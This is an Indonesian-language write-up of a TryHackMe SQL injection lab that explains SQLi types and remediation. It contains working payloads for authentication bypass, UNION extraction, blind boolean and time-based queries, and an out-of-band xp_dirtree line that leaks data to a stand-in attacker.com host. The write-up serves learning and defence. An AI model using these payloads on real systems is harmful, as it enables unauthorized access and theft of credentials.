# TryHackMe: SQL Injection


---

- **Room Link:** [SQL Injection](https://tryhackme.com/room/sqlinjectionlm)
- **Category:** Web Security
- **Difficulty:** Medium

---

## Task 1: Brief

**SQL Injection (SQLi)** adalah kerentanan keamanan web yang memungkinkan penyerang untuk memanipulasi query yang dibuat aplikasi ke databasenya. Hal ini memungkinkan penyerang untuk melihat data yang biasanya tidak bisa mereka ambil, seperti data milik pengguna lain, atau data apa pun yang dapat diakses oleh aplikasi itu sendiri. Dalam banyak kasus, penyerang dapat memodifikasi atau menghapus data ini, menyebabkan perubahan permanen pada konten atau aplikasi.

---

## Task 2: What is a Database?

**Database** adalah kumpulan data yang terstruktur.
*   **DBMS (Database Management System):** Perangkat lunak yang digunakan untuk mengelola database (misalnya, MySQL, PostgreSQL, Microsoft SQL Server).
*   **Relational Database (RDBMS):** Menyimpan data dalam tabel dengan baris dan kolom. Menggunakan SQL.
    *   Contoh: MySQL, PostgreSQL, MSSQL, SQLite.
*   **Non-Relational Database (NoSQL):** Menyimpan data dalam format lain (dokumen, key-value pair).
    *   Contoh: MongoDB, Redis.

---

## Task 3: What is SQL?

**SQL (Structured Query Language)** adalah bahasa standar untuk berinteraksi dengan Relational Database.

**Perintah Dasar:**
1.  **SELECT:** Mengambil data.
    ```sql
    SELECT * FROM users WHERE username = 'admin';
    ```
2.  **INSERT:** Menambahkan data baru.
    ```sql
    INSERT INTO users (username, password) VALUES ('dimm', '12345');
    ```
3.  **UPDATE:** Mengubah data yang sudah ada.
    ```sql
    UPDATE users SET password = 'newpass' WHERE username = 'dimm';
    ```
4.  **DELETE:** Menghapus data.
    ```sql
    DELETE FROM users WHERE username = 'dimm';
    ```

---

## Task 4: What is SQL Injection?

SQL Injection terjadi ketika input pengguna yang tidak dipercaya digabungkan secara dinamis langsung ke dalam query database tanpa sanitasi yang tepat.

**Contoh Kerentanan:**
```php
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '" . $username . "'";
```
Jika inputnya adalah `' OR 1=1 --`:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --'
```
*   `'`: Menutup field data.
*   `OR 1=1`: Kondisi yang Selalu Benar (Always True).
*   `--`: Mengomentari (mematikan) sisa query.

---

## Task 5: In-Band SQLi

**In-Band SQLi** adalah ketika penyerang menggunakan saluran komunikasi yang sama untuk meluncurkan serangan dan mengumpulkan hasilnya.

1.  **Error-Based SQLi:**
    *   Mengandalkan pesan error yang dikeluarkan oleh server database untuk mendapatkan informasi tentang struktur database.
    *   Contoh: Menambahkan `'` menyebabkan syntax error, yang bisa mengungkap tipe DB di backend.

2.  **Union-Based SQLi:**
    *   Menggunakan operator `UNION` untuk menggabungkan hasil dari dua atau lebih statement SELECT menjadi satu hasil.
    *   **Syarat:** Jumlah kolom harus sama dan tipe datanya kompatibel.
    *   Contoh: `' UNION SELECT username, password FROM users --`

---

## Task 6: Blind SQLi - Authentication Bypass

**Blind SQLi:** Aplikasi tidak mengembalikan hasil query SQL secara langsung.
**Authentication Bypass:**
*   Menargetkan formulir login untuk masuk tanpa password.
*   Payload: `' OR 1=1 --` atau `admin' --` atau `' OR 1=1 LIMIT 1 --`
*   Tujuan: Membuat query mengembalikan setidaknya satu baris (user admin) sehingga aplikasi mengira login berhasil.

---

## Task 7: Blind SQLi - Boolean Based

**Konsep:**
*   Aplikasi memberikan respons yang berbeda (konten halaman, kode status HTTP) tergantung apakah query bernilai TRUE atau FALSE.
*   Kita bisa mengajukan pertanyaan Ya/Tidak ke database untuk mengekstrak data karakter demi karakter.

**Contoh:**
Cek apakah username adalah 'admin':
```sql
admin' AND 1=1 -- (True - Halaman memuat normal)
admin' AND 1=0 -- (False - Halaman hilang konten/404)
```
Cek huruf pertama password:
```sql
admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' --
```

---

## Task 8: Blind SQLi - Time Based

**Konsep:**
*   Digunakan ketika aplikasi TIDAK memberikan perbedaan respons yang terlihat (tidak ada error, tidak ada perubahan konten).
*   Kita menyuntikkan perintah **Time Delay** (tidur). Jika query dieksekusi berhasil (TRUE), server akan menunggu selama X detik.

**Payloads:**
*   **MySQL:** `SLEEP(5)`
*   **PostgreSQL:** `pg_sleep(5)`
*   **MSSQL:** `WAITFOR DELAY '0:0:5'`

**Contoh:**
Jika versi database diawali dengan angka '5', tidur selama 5 detik:
```sql
' AND IF(SUBSTRING(VERSION(),1,1)='5', SLEEP(5), 0) --
```

---

## Task 9: Out-of-Band SQLi

**Konsep:**
*   Digunakan ketika teknik In-Band dan Blind tidak memungkinkan (misalnya, pemrosesan asinkron).
*   Mengandalkan kemampuan server database untuk membuat request DNS atau HTTP guna mengirimkan data ke server yang dikontrol penyerang.

**Contoh (MSSQL dengan `xp_dirtree`):**
Meminta file dari server penyerang, membocorkan data di subdomain:
```sql
'; exec master..xp_dirtree '\\admin-password.attacker.com\foo' --
```
*   Penyerang memantau log DNS untuk `admin-password.attacker.com`.

---

## Task 10: Remediation

**Cara Memperbaiki:**

1.  **Prepared Statements (Parameterized Queries):**
    *   Database memperlakukan input pengguna sebagai data, bukan kode yang dapat dieksekusi.
    *   **PHP (PDO):**
        ```php
        $stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
        $stmt->execute(['email' => $email]);
        ```

2.  **Input Validation:**
    *   Deny-list (Blokir karakter berbahaya seperti `'`, `--`) - **Lemah**.
    *   Allow-list (Hanya izinkan serangkaian karakter tertentu, misal: alfanumerik) - **Kuat**.

3.  **Principle of Least Privilege:**
    *   User database yang digunakan oleh aplikasi web hanya boleh memiliki izin yang diperlukan untuk fungsinya (misal: hanya SELECT/INSERT, tidak boleh DROP TABLE atau akses FILE).
